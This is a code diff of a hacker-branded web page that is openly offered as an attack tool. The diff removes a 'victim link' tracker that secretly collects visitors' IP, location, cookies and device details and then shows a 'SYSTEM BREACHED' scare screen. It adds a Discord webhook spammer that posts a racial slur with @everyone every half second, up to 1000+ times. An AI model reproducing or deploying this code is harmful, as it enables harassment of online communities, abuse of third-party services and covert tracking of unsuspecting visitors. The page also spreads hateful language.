@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Xymatekidd Webhook Hacks</title>
     <style>
         :root {
             --main-color: #ff0000;
@@ -106,45 +106,35 @@
             box-shadow: 0 5px 15px rgba(255,0,0,0.3);
         }
         
-        .victim-container {
-            margin-top: 30px;
-        }
-        
-        .victim-box {
+        .webhook-box {
             background-color: rgba(0,0,0,0.8);
             border: 1px solid var(--main-color);
             border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 15px;
-            font-family: monospace;
-            position: relative;
-        }
-        
-        .victim-id {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            color: var(--main-color);
-            font-weight: bold;
-        }
-        
-        .victim-info {
-            white-space: pre;
-            overflow-x: auto;
-            margin-top: 10px;
-        }
-        
-        .link-generator {
+            padding: 20px;
             margin-top: 30px;
-            text-align: center;
         }
         
-        .generated-link {
-            margin-top: 15px;
+        .webhook-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            background-color: #222;
+            border: 1px solid #444;
+            border-radius: 3px;
+            color: white;
+        }
+        
+        .status {
+            margin-top: 20px;
             padding: 10px;
             background-color: #222;
-            border: 1px dashed #444;
-            word-break: break-all;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .counter {
+            color: var(--main-color);
+            font-weight: bold;
         }
         
         .hidden {
@@ -205,12 +195,30 @@
             90% { clip: rect(70px, 9999px, 100px, 0); }
             100% { clip: rect(30px, 9999px, 130px, 0); }
         }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--main-color);
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            z-index: 1000;
+            animation: slideIn 0.5s forwards;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); }
+            to { transform: translateX(0); }
+        }
     </style>
 </head>
 <body>
     <div id="login-page">
         <div class="container">
-            <h1 class="title glitch" data-text="Xymatekidd Login">Xymatekidd Login</h1>
+            <h1 class="title glitch" data-text="Xymatekidd Webhook Hacks😈😈😈">Xymatekidd Webhook Hacks😈😈😈</h1>
             
             <div class="login-box">
                 <h2>Login</h2>
@@ -233,29 +241,22 @@
     
     <div id="main-page" class="hidden">
         <div class="container">
-            <h1 class="title glitch" data-text="VICTIM COOKED">VICTIM COOKED</h1>
+            <h1 class="title glitch" data-text="Xymatekidd Webhook F4cker V5.1">Xymatekidd Webhook F4cker V5.1</h1>
             
-            <div class="link-generator">
-                <button id="generate-link">Generate Victim Link</button>
-                <div id="generated-link-container" class="hidden">
-                    <p>Send this link to your victim:</p>
-                    <div class="generated-link" id="generated-link"></div>
+            <div class="webhook-box">
+                <input type="text" id="webhook-url" class="webhook-input" placeholder="Enter Discord Webhook URL">
+                <button id="start-spam">START F4CKING</button>
+                <button id="stop-spam" class="hidden">STOP SPAM</button>
+                
+                <div class="status">
+                    <p>Status: <span id="status-text">Ready</span></p>
+                    <p>Messages sent: <span id="counter" class="counter">0</span>/1000+</p>
                 </div>
-            </div>
-            
-            <h2>Victim Information:</h2>
-            <div class="victim-container" id="victim-container">
-                No victim data collected yet...
             </div>
         </div>
     </div>
     
     <script>
-        // Generate random ID for tracking
-        function generateId() {
-            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-        }
-        
         // Login functionality
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -263,181 +264,78 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            if(username === 'Xymatekidd' && password === 'Xymatekidd') {
+            if(username === 'Xymatekidd' && password === 'Xymatekiddontop') {
                 document.getElementById('login-page').classList.add('hidden');
                 document.getElementById('main-page').classList.remove('hidden');
-                loadVictimData();
             } else {
                 alert('Invalid credentials!');
             }
         });
         
-        // Victim link generator
-        document.getElementById('generate-link').addEventListener('click', function() {
-            const currentUrl = window.location.origin + window.location.pathname;
-            const trackingId = generateId();
-            const victimLink = `${currentUrl}#${trackingId}`;
-            
-            document.getElementById('generated-link').textContent = victimLink;
-            document.getElementById('generated-link-container').classList.remove('hidden');
-            
-            // Copy to clipboard
-            navigator.clipboard.writeText(victimLink).then(() => {
-                alert('Link copied to clipboard!');
-            });
-        });
+        // Webhook spammer
+        let spamInterval;
+        let messageCount = 0;
+        const spamMessage = "YALL GOT FUCKED BY XYMATEKIDD NIGGERSSS @everyone";
         
-        // Function to get victim IP (using a free API)
-        async function getVictimIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error getting IP:', error);
-                return 'Unknown';
-            }
-        }
-        
-        // Enhanced victim data collection
-        async function collectVictimData(trackingId) {
-            const ip = await getVictimIP();
-            const data = {
-                id: trackingId,
-                ip: ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                colorDepth: window.screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                languages: navigator.languages,
-                cookies: document.cookie,
-                referrer: document.referrer,
-                timestamp: new Date().toISOString(),
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                location: await getApproximateLocation(ip)
-            };
+        document.getElementById('start-spam').addEventListener('click', function() {
+            const webhookUrl = document.getElementById('webhook-url').value;
             
-            return data;
-        }
-        
-        // Get approximate location from IP
-        async function getApproximateLocation(ip) {
-            if (ip === 'Unknown') return 'Unknown';
-            
-            try {
-                const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await response.json();
-                return {
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    postal: data.postal || 'Unknown',
-                    latitude: data.latitude || 'Unknown',
-                    longitude: data.longitude || 'Unknown'
-                };
-            } catch (error) {
-                console.error('Error getting location:', error);
-                return 'Unknown';
-            }
-        }
-        
-        // Format victim data for display
-        function formatVictimData(data) {
-            let formattedData = `=== VICTIM DATA ===\n\n`;
-            
-            for (const [key, value] of Object.entries(data)) {
-                if (typeof value === 'object') {
-                    formattedData += `${key}:\n`;
-                    for (const [subKey, subValue] of Object.entries(value)) {
-                        formattedData += `  ${subKey}: ${subValue}\n`;
-                    }
-                } else {
-                    formattedData += `${key}: ${value}\n`;
-                }
-                formattedData += '\n';
-            }
-            
-            return formattedData;
-        }
-        
-        // Create victim box element
-        function createVictimBox(data) {
-            const box = document.createElement('div');
-            box.className = 'victim-box';
-            
-            const idElement = document.createElement('div');
-            idElement.className = 'victim-id';
-            idElement.textContent = `ID: ${data.id}`;
-            
-            const infoElement = document.createElement('div');
-            infoElement.className = 'victim-info';
-            infoElement.textContent = formatVictimData(data);
-            
-            box.appendChild(idElement);
-            box.appendChild(infoElement);
-            
-            return box;
-        }
-        
-        // Load and display victim data
-        function loadVictimData() {
-            const victims = JSON.parse(localStorage.getItem('victims') || [];
-            const container = document.getElementById('victim-container');
-            
-            if (victims.length === 0) {
-                container.innerHTML = 'No victim data collected yet...';
+            if (!webhookUrl) {
+                alert('Please enter a webhook URL!');
                 return;
             }
             
-            container.innerHTML = '';
-            victims.forEach(victim => {
-                container.appendChild(createVictimBox(victim));
-            });
-        }
+            // Show notification
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.textContent = 'SEND 1000+ MESSAGE FROM THE SERVER';
+            document.body.appendChild(notification);
+            
+            // Remove notification after 3 seconds
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+            
+            // Start spamming
+            document.getElementById('start-spam').classList.add('hidden');
+            document.getElementById('stop-spam').classList.remove('hidden');
+            document.getElementById('status-text').textContent = 'Spamming...';
+            
+            spamInterval = setInterval(() => {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: spamMessage
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        messageCount++;
+                        document.getElementById('counter').textContent = messageCount;
+                        
+                        if (messageCount >= 1000) {
+                            document.getElementById('status-text').textContent = 'Done successfully sent 1000+ messages';
+                            clearInterval(spamInterval);
+                            document.getElementById('start-spam').classList.remove('hidden');
+                            document.getElementById('stop-spam').classList.add('hidden');
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('status-text').textContent = 'Error sending message';
+                });
+            }, 500); // 0.5 second delay between messages
+        });
         
-        // Check if victim page and collect data
-        async function checkForVictim() {
-            const trackingId = window.location.hash.substring(1);
-            if (trackingId) {
-                const victimData = await collectVictimData(trackingId);
-                
-                // Store data in localStorage
-                const victims = JSON.parse(localStorage.getItem('victims') || [];
-                victims.push(victimData);
-                localStorage.setItem('victims', JSON.stringify(victims));
-                
-                // Display scary message to victim
-                document.body.innerHTML = `
-                    <div style="
-                        background-color: black;
-                        color: red;
-                        height: 100vh;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        flex-direction: column;
-                        font-family: monospace;
-                        text-align: center;
-                        padding: 20px;
-                    ">
-                        <h1 style="font-size: 3rem; margin-bottom: 30px;">SYSTEM BREACHED</h1>
-                        <p style="font-size: 1.5rem;">Your information has been captured</p>
-                        <p style="margin-top: 50px; color: #666;">This page will close automatically</p>
-                    </div>
-                `;
-                
-                // Close after 5 seconds
-                setTimeout(() => {
-                    window.close();
-                }, 5000);
-            }
-        }
-        
-        // Run checks when page loads
-        window.addEventListener('DOMContentLoaded', async () => {
-            await checkForVictim();
+        document.getElementById('stop-spam').addEventListener('click', function() {
+            clearInterval(spamInterval);
+            document.getElementById('status-text').textContent = 'Stopped manually';
+            document.getElementById('start-spam').classList.remove('hidden');
+            document.getElementById('stop-spam').classList.add('hidden');
         });
     </script>
 </body>
